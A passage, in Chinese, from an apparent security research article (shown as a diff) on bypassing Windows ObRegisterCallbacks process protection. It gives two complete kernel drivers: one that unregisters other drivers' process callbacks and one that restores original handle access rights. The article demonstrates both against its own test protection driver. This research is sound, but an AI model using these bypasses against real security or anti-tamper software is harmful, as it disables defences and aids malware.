@@ -1,0 +1,139 @@
+        void* DefaultObject;
+        unsigned __int8 Index;
+        unsigned int TotalNumberOfObjects;
+        unsigned int TotalNumberOfHandles;
+        unsigned int HighWaterNumberOfObjects;
+        unsigned int HighWaterNumberOfHandles;
+        //_OBJECT_TYPE_INITIALIZER TypeInfo;
+        unsigned __int8 Placeholder[0x78];
+        EX_PUSH_LOCK TypeLock;
+        unsigned int Key;
+        LIST_ENTRY CallbackList;
+    }OBJECT_TYPE;
+    typedef struct _CALLBACK_ENTRY CALLBACK_ENTRY;
+    typedef struct _CALLBACK_ENTRY_ITEM CALLBACK_ENTRY_ITEM;
+    struct _CALLBACK_ENTRY_ITEM {
+        LIST_ENTRY EntryItemList;
+        OB_OPERATION Operations;
+        CALLBACK_ENTRY* CallbackEntry;
+        POBJECT_TYPE ObjectType;
+        POB_PRE_OPERATION_CALLBACK PreOperation;
+        POB_POST_OPERATION_CALLBACK PostOperation;
+        __int64 unk;
+    };
+    struct _CALLBACK_ENTRY {
+        __int16 Version;
+        char buffer1[6];
+        POB_OPERATION_REGISTRATION RegistrationContext;
+        __int16 AltitudeLength1;
+        __int16 AltitudeLength2;
+        char buffer2[4];
+        WCHAR* AltitudeString;
+        CALLBACK_ENTRY_ITEM Items;
+    };
+    VOID OnUnload(_In_ PDRIVER_OBJECT DriverObject)
+    {
+        UNREFERENCED_PARAMETER(DriverObject);
+        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "UnloadObCB: unload driver\n"));
+    }
+    NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
+        UNREFERENCED_PARAMETER(DriverObject);
+        UNREFERENCED_PARAMETER(RegistryPath);
+        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "UnloadObCB: driver entry\n"));
+        // register unload function
+        DriverObject->DriverUnload = OnUnload;
+        // get "PsProcessType" kernel handle
+        OBJECT_TYPE* pspt = *(POBJECT_TYPE*)PsProcessType;
+        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "UnloadObCB: pspt = %p\n", pspt));
+        // traverse callback list
+        PLIST_ENTRY head = (PLIST_ENTRY)&(pspt->CallbackList);
+        PLIST_ENTRY current = head->Blink;
+        // actually, we skipped the head node, accessing this node will cause a memory access error, maybe the head does not store real data. (head->Operation = 0x4b424742, this should be a boundary tag)
+        while (current != head) {
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "UnloadObCB: c=0x%llx, c->Flink=0x%llx, c->Blink=0x%llx\n", current, current->Flink, current->Blink));
+            CALLBACK_ENTRY_ITEM* item = (CALLBACK_ENTRY_ITEM*)current;
+            CALLBACK_ENTRY* entry = item->CallbackEntry;
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "UnloadObCB: unregister Entry=%p, Altitude = %ls\n", entry, entry->AltitudeString));
+            ObUnRegisterCallbacks(entry);
+            current = current->Blink;
+        }
+        return STATUS_SUCCESS;
+    }
+编译代码后也为该驱动程序创建服务 `UnloadObCB`，首先使用上文的 `ProcessProtect` 对 `cmd.exe`
+进行进程保护，随后再使用 `UnloadObCB` 卸载回调，在任务管理器中发现可以正常关闭 `cmd.exe` 进程，执行如下：
+其中 `Altitude = 1000` 的回调就是我们 `ProcessProtect` 所添加的回调函数对象。
+但是这种方式并不通用和稳定，首先是其结构体可能因操作系统版本的变化而变化，其次当原驱动退出时会调用 `ObUnRegisterCallbacks`
+卸载自己的回调函数，但由于已经被我们卸载了，这里就会触发蓝屏。
+### 0x03 覆盖回调操作
+我们再尝试去寻找一些更稳定的绕过 ObRegisterCallbacks 的方法，细心同学已经发现当我们注册回调时需要添加
+`Altitude`(https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/load-order-groups-and-altitudes-for-minifilter-drivers)，该值为十进制的字符串，表示驱动程序的加载顺序，在 ObRegisterCallbacks 中表示回调函数的执行顺序：
+`Pre-` 回调函数链按 `Altitude` 从高到低的顺序调用，再执行实际的函数调用，然后是 `Post-` 回调函数链，按 `Altitude`
+从低到高的顺序调用；
+根据回调函数的调用顺序，那么我们可以考虑在 `Post-` 回调函数链的末尾设置恢复进程句柄权限的函数，即可覆盖之前的回调函数的操作；但由于 `Post-`
+链上的 `GrantedAccess` 可读不可写，所以我们在 `Pre-` 回调函数链的末尾(这里我们设置为
+`Altitude=999`)进行操作，编写代码如下：
+    #include 
+    #include 
+    DRIVER_INITIALIZE DriverEntry;
+    NTKERNELAPI UCHAR* PsGetProcessImageFileName(__in PEPROCESS Process);
+    PVOID RegistrationHandle = NULL;
+    OB_PREOP_CALLBACK_STATUS PreOperationCallback(_In_ PVOID RegistrationContext, _In_ POB_PRE_OPERATION_INFORMATION OperationInformation) {
+        UNREFERENCED_PARAMETER(RegistrationContext);
+        // filter by process name "cmd.exe"
+        PUCHAR name = PsGetProcessImageFileName((PEPROCESS)OperationInformation->Object);
+        if (strcmp((const char*)name, "cmd.exe") != 0) {
+            return OB_PREOP_SUCCESS;
+        }
+        if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE) {
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "RecoverObCB: recover DesiredAccess=0x%x to OriginalDesiredAccess=0x%x\n",
+                OperationInformation->Parameters->CreateHandleInformation.DesiredAccess,
+                OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess
+            ));
+            OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess;
+        }
+        return OB_PREOP_SUCCESS;
+    }
+    VOID OnUnload(_In_ PDRIVER_OBJECT DriverObject)
+    {
+        UNREFERENCED_PARAMETER(DriverObject);
+        // unregister callbacks
+        if (RegistrationHandle != NULL) {
+            ObUnRegisterCallbacks(RegistrationHandle);
+            RegistrationHandle = NULL;
+        }
+        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "RecoverObCB: unload driver\n"));
+    }
+    NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
+        OB_OPERATION_REGISTRATION OperationRegistrations = { 0 };
+        OB_CALLBACK_REGISTRATION  ObRegistration = { 0 };
+        UNICODE_STRING Altitude = { 0 };
+        NTSTATUS Status = STATUS_SUCCESS;
+        UNREFERENCED_PARAMETER(DriverObject);
+        UNREFERENCED_PARAMETER(RegistryPath);
+        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "RecoverObCB: driver entry\n"));
+        // register unload function
+        DriverObject->DriverUnload = OnUnload;
+        // setup the ObRegistration calls
+        OperationRegistrations.ObjectType = PsProcessType;
+        OperationRegistrations.Operations = OB_OPERATION_HANDLE_CREATE;
+        OperationRegistrations.PreOperation = PreOperationCallback;
+        RtlInitUnicodeString(&Altitude, L"999");
+        ObRegistration.Version = OB_FLT_REGISTRATION_VERSION;
+        ObRegistration.OperationRegistrationCount = 1;
+        ObRegistration.Altitude = Altitude;
+        ObRegistration.RegistrationContext = NULL;
+        ObRegistration.OperationRegistration = &OperationRegistrations;
+        Status = ObRegisterCallbacks(&ObRegistration, &RegistrationHandle);
+        if (!NT_SUCCESS(Status)) {
+            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "RecoverObCB: ObRegisterCallbcks failed status 0x%x\n", Status));
+            return Status;
+        }
+        return STATUS_SUCCESS;
+    }
+编译代码后也为该驱动程序创建服务 `RecoverObCB`，首先使用上文的 `ProcessProtect` 对 `cmd.exe`
+进行进程保护，随后再使用 `RecoverObCB` 覆盖回调操作，在任务管理器中发现可以正常关闭 `cmd.exe` 进程，执行如下：
+上图中当使用任务管理器关闭 `cmd.exe` 进程时，`RecoverObCB` 使用进程申请权限
+`OriginalDesiredAccess=0x1001` 覆盖实际给予的权限 `DesiredAccess=0x1000`，从而覆盖掉
+`ProcessProtect` 的操作，实现了对进程保护的绕过。
+### 0x04 References
+* * *
